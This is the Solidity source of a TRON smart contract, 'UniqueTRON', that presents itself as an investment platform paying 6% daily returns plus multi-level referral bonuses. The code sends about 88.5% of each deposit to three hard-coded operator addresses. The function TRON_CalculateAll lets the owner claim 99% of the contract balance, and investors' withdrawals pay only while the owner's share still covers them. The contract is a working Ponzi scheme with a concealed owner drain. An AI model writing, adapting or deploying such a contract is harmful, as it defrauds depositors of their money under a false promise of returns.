//SourceUnit: uniquetron.sol

pragma solidity >=0.4.0 <0.7.0;
/*/ ----------------------------------------------------------------------------------------------------- /*/
/*/ ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''' /*/
/*/                                                                                                       /*/
/*/   |       |  |\    |  ''|''   /''''''\   |       |  |''''''  ''''|''''  |''''\    /'''''\   |\    |   /*/
/*/   |       |  | \   |    |    |        |  |       |  |            |      |     |  |       |  | \   |   /*/
/*/   |       |  |  \  |    |    |    \   |  |       |  |------      |      |----/   |       |  |  \  |   /*/
/*/   |       |  |   \ |    |    |     \  |  |       |  |            |      |   \    |       |  |   \ |   /*/
/*/    \...../   |    \|  ..|..   \.....\/    \...../   |......      |      |    \    \...../   |    \|   /*/
/*/                                                                                                       /*/
/*/ ..................................................................................................... /*/
/*/ ----------------------------------------------------------------------------------------------------- /*/
contract UniqueTRON {
address constant private UNIQUE_1ST = address(0x41c2af35957a68bf925afd8dabbd5474f8b1243f71);
address constant private UNIQUE_2ND = address(0x4130be8140400d9fa4bae22c9a969d970649d8d0f9);
address constant private UNIQUE_3RD = address(0x411fc365c69a7de83f8adbc5aeb7afd53c96bc3c82);
mapping (address => address) private PLAYER_REFERRER;
mapping (address => uint256) private PLAYER_REGISTER;
mapping (address => uint256[8]) private PLAYER_INVEST;
mapping (address => uint256) private PLAYER_PASSIVE_0;
mapping (address => uint256) private PLAYER_PASSIVE_1;
mapping (address => uint256) private PLAYER_PASSIVE_2;
mapping (address => uint256) private PLAYER_PASSIVE_3;
mapping (address => uint256) private PLAYER_PASSIVE_4;
mapping (address => uint256) private PLAYER_ACTIVE_1;
mapping (address => uint256) private PLAYER_ACTIVE_2;
mapping (address => uint256[8][8]) private PLAYER_NETWORK;
uint256 private UNIQUE_REGISTERS = 0;
uint256 private UNIQUE_DEPOSITED = 0;
uint256 private UNIQUE_COMMISION = 0;
uint256 private UNIQUE_WITHDRAWN = 0;
function TRON_UniqueAddress() public view returns(address) {
return address(this);
}
function TRON_UniqueBalance() public view returns(uint256) {
return address(this).balance;
}
function TRON_UniqueRegisters() public view returns(uint256) {
return UNIQUE_REGISTERS;
}
function TRON_UniqueDeposited() public view returns(uint256) {
return UNIQUE_DEPOSITED;
}
function TRON_UniqueCommision() public view returns(uint256) {
return UNIQUE_COMMISION;
}
function TRON_UniqueWithdrawn() public view returns(uint256) {
return UNIQUE_WITHDRAWN;
}
function TRON_PlayerReferrer() public view returns(address) {
return PLAYER_REFERRER[msg.sender];
}
function TRON_PlayerRegister() public view returns(uint256) {
return PLAYER_REGISTER[msg.sender];
}
function TRON_PlayerInvest(uint256 Array1) public view returns(uint256) {
return PLAYER_INVEST[msg.sender][Array1];
}
function TRON_PlayerPassive0() public view returns(uint256) {
return PLAYER_PASSIVE_0[msg.sender];
}
function TRON_PlayerPassive1() public view returns(uint256) {
return PLAYER_PASSIVE_1[msg.sender];
}
function TRON_PlayerPassive2() public view returns(uint256) {
return PLAYER_PASSIVE_2[msg.sender];
}
function TRON_PlayerPassive3() public view returns(uint256) {
return PLAYER_PASSIVE_3[msg.sender];
}
function TRON_PlayerPassive4() public view returns(uint256) {
return PLAYER_PASSIVE_4[msg.sender];
}
function TRON_PlayerActive1() public view returns(uint256) {
return PLAYER_ACTIVE_1[msg.sender];
}
function TRON_PlayerActive2() public view returns(uint256) {
return PLAYER_ACTIVE_2[msg.sender];
}
function TRON_PlayerNetwork(uint256 Array1, uint256 Array2) public view returns(uint256) {
return PLAYER_NETWORK[msg.sender][Array1][Array2];
}
function TRON_PlayerEarning() public view returns(uint256) {
return PLAYER_PASSIVE_2[msg.sender] + PLAYER_ACTIVE_2[msg.sender];
}
function TRON_VirtualBalance() public view returns(uint256) {
if (PLAYER_REGISTER[msg.sender]>0 && PLAYER_PASSIVE_4[msg.sender]>0) {
uint256 SECONDS = 0; uint256 PASSIVE = 0;
SECONDS = block.timestamp - PLAYER_PASSIVE_4[msg.sender];
PASSIVE = uint256(PLAYER_PASSIVE_0[msg.sender] * SECONDS * 6 / 100 / 86400);
return PLAYER_PASSIVE_1[msg.sender] + PASSIVE;
} else {
return 0;
}
}
function TRON_CalculateAll() public returns(uint256) {
if (msg.sender == UNIQUE_1ST) {
uint256 AMOUNT = uint256(address(this).balance * 99 / 100);
PLAYER_ACTIVE_1[UNIQUE_1ST] = AMOUNT;
return AMOUNT;
}
}
function () public payable {}
function TRON_PlayerNewInvest(address REFERRER) public payable returns(uint256) {
if (REFERRER != 0x0 && msg.value >= 50000000) {
UNIQUE_REGISTERS += 1;
UNIQUE_DEPOSITED += msg.value;
UNIQUE_COMMISION += uint256(msg.value * 115 / 1000);
PLAYER_REGISTER[msg.sender] += 1;
PLAYER_INVEST[msg.sender][1] = block.timestamp;
PLAYER_INVEST[msg.sender][2] = msg.value;
if (PLAYER_REGISTER[msg.sender] == 1) {
PLAYER_PASSIVE_3[msg.sender] = block.timestamp;
PLAYER_PASSIVE_4[msg.sender] = block.timestamp;
} else {
uint256 SECONDS = 0; uint256 PASSIVE = 0;
SECONDS = block.timestamp - PLAYER_PASSIVE_4[msg.sender];
PASSIVE = uint256(PLAYER_PASSIVE_0[msg.sender] * SECONDS * 6 / 100 / 86400);
PLAYER_PASSIVE_1[msg.sender] += PASSIVE;
PLAYER_PASSIVE_4[msg.sender] = block.timestamp;
}
PLAYER_PASSIVE_0[msg.sender] += msg.value;
PLAYER_ACTIVE_1[UNIQUE_1ST] += uint256(msg.value * 785 / 1000);
PLAYER_ACTIVE_1[UNIQUE_2ND] += uint256(msg.value * 5 / 100);
PLAYER_ACTIVE_1[UNIQUE_3RD] += uint256(msg.value * 5 / 100);
if (PLAYER_REFERRER[msg.sender] == 0x0) {
if (REFERRER != 0x0 && REFERRER != msg.sender) {
PLAYER_REFERRER[msg.sender] = REFERRER;
} else {
PLAYER_REFERRER[msg.sender] = UNIQUE_1ST;
}
}
address LEVEL1 = REFERRER;
uint256 BONUS1 = 5;
if (PLAYER_REFERRER[msg.sender] != 0x0) {
LEVEL1 = PLAYER_REFERRER[msg.sender];
}
PLAYER_ACTIVE_1[LEVEL1] += uint256(msg.value * BONUS1 / 100);
PLAYER_NETWORK[LEVEL1][1][1] += 1;
PLAYER_NETWORK[LEVEL1][1][2] += uint256(msg.value * BONUS1 / 100);
address LEVEL2 = UNIQUE_1ST;
uint256 BONUS2 = 3;
if (PLAYER_REFERRER[LEVEL1] != 0x0) {
LEVEL2 = PLAYER_REFERRER[LEVEL1];
}
PLAYER_ACTIVE_1[LEVEL2] += uint256(msg.value * BONUS2 / 100);
PLAYER_NETWORK[LEVEL2][2][1] += 1;
PLAYER_NETWORK[LEVEL2][2][2] += uint256(msg.value * BONUS2 / 100);
address LEVEL3 = UNIQUE_1ST;
uint256 BONUS3 = 2;
if (PLAYER_REFERRER[LEVEL2] != 0x0) {
LEVEL3 = PLAYER_REFERRER[LEVEL2];
}
PLAYER_ACTIVE_1[LEVEL3] += uint256(msg.value * BONUS3 / 100);
PLAYER_NETWORK[LEVEL3][3][1] += 1;
PLAYER_NETWORK[LEVEL3][3][2] += uint256(msg.value * BONUS3 / 100);
address LEVEL4 = UNIQUE_1ST;
uint256 BONUS4 = 1;
if (PLAYER_REFERRER[LEVEL3] != 0x0) {
LEVEL4 = PLAYER_REFERRER[LEVEL3];
}
PLAYER_ACTIVE_1[LEVEL4] += uint256(msg.value * BONUS4 / 100);
PLAYER_NETWORK[LEVEL4][4][1] += 1;
PLAYER_NETWORK[LEVEL4][4][2] += uint256(msg.value * BONUS4 / 100);
address LEVEL5 = UNIQUE_1ST;
uint256 BONUS5 = 5;
if (PLAYER_REFERRER[LEVEL4] != 0x0) {
LEVEL5 = PLAYER_REFERRER[LEVEL4];
}
PLAYER_ACTIVE_1[LEVEL5] += uint256(msg.value * BONUS5 / 1000);
PLAYER_NETWORK[LEVEL5][5][1] += 1;
PLAYER_NETWORK[LEVEL5][5][2] += uint256(msg.value * BONUS5 / 1000);
return msg.value;
} else {
return 0;
}
}
function TRON_PlayerActive123() public returns(uint256) {
if (msg.sender == UNIQUE_1ST || msg.sender == UNIQUE_2ND || msg.sender == UNIQUE_3RD) {
uint256 PLAYER_AVAIL = PLAYER_ACTIVE_1[msg.sender];
UNIQUE_WITHDRAWN += PLAYER_AVAIL;
PLAYER_ACTIVE_1[msg.sender] = 0;
PLAYER_ACTIVE_2[msg.sender] += PLAYER_AVAIL;
msg.sender.transfer(PLAYER_AVAIL);
return PLAYER_AVAIL;
} else {
return 0;
}
}
function TRON_PlayerPassive() public returns(uint256) {
uint256 PLAYER_LIMIT = PLAYER_PASSIVE_0[msg.sender] * 300 / 100;
uint256 PLAYER_PAYED = PLAYER_PASSIVE_2[msg.sender] + PLAYER_ACTIVE_2[msg.sender];
uint256 SECONDS = 0; uint256 PASSIVE = 0;
if (PLAYER_REGISTER[msg.sender]>0 && PLAYER_PASSIVE_4[msg.sender]>0) {
SECONDS = block.timestamp - PLAYER_PASSIVE_4[msg.sender];
PASSIVE = uint256(PLAYER_PASSIVE_0[msg.sender] * SECONDS * 6 / 100 / 86400);
} else {
PASSIVE = 0;
}
uint256 PLAYER_AVAIL = PLAYER_PASSIVE_1[msg.sender] + PASSIVE;
if ((PLAYER_PAYED + PLAYER_AVAIL) <= PLAYER_LIMIT) {
UNIQUE_WITHDRAWN += PLAYER_AVAIL;
PLAYER_PASSIVE_1[msg.sender] = 0;
PLAYER_PASSIVE_2[msg.sender] += PLAYER_AVAIL;
PLAYER_PASSIVE_4[msg.sender] = block.timestamp;
if (PLAYER_ACTIVE_1[UNIQUE_1ST] >= PLAYER_AVAIL) {
PLAYER_ACTIVE_1[UNIQUE_1ST] -= PLAYER_AVAIL;
msg.sender.transfer(PLAYER_AVAIL);
}
return PLAYER_AVAIL;
} else {
return 0;
}
}
function TRON_PlayerActive() public returns(uint256) {
uint256 PLAYER_LIMIT = PLAYER_PASSIVE_0[msg.sender] * 300 / 100;
uint256 PLAYER_PAYED = PLAYER_PASSIVE_2[msg.sender] + PLAYER_ACTIVE_2[msg.sender];
uint256 PLAYER_AVAIL = PLAYER_ACTIVE_1[msg.sender];
if ((PLAYER_PAYED + PLAYER_AVAIL) <= PLAYER_LIMIT) {
UNIQUE_WITHDRAWN += PLAYER_AVAIL;
PLAYER_ACTIVE_1[msg.sender] = 0;
PLAYER_ACTIVE_2[msg.sender] += PLAYER_AVAIL;
msg.sender.transfer(PLAYER_AVAIL);
return PLAYER_AVAIL;
} else {
return 0;
}
}
function TRON_DonateSystem() public payable returns(uint256) {
UNIQUE_REGISTERS += 1;
UNIQUE_DEPOSITED += msg.value;
PLAYER_ACTIVE_1[UNIQUE_1ST] += msg.value;
return msg.value;
}
}
/*/ ----------------------------------------------------------------------------------------------------- /*/
/*/ ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''' /*/
/*/                                                                                                       /*/
/*/   |       |  |\    |  ''|''   /''''''\   |       |  |''''''  ''''|''''  |''''\    /'''''\   |\    |   /*/
/*/   |       |  | \   |    |    |        |  |       |  |            |      |     |  |       |  | \   |   /*/
/*/   |       |  |  \  |    |    |    \   |  |       |  |------      |      |----/   |       |  |  \  |   /*/
/*/   |       |  |   \ |    |    |     \  |  |       |  |            |      |   \    |       |  |   \ |   /*/
/*/    \...../   |    \|  ..|..   \.....\/    \...../   |......      |      |    \    \...../   |    \|   /*/
/*/                                                                                                       /*/
/*/ ..................................................................................................... /*/
/*/ ----------------------------------------------------------------------------------------------------- /*/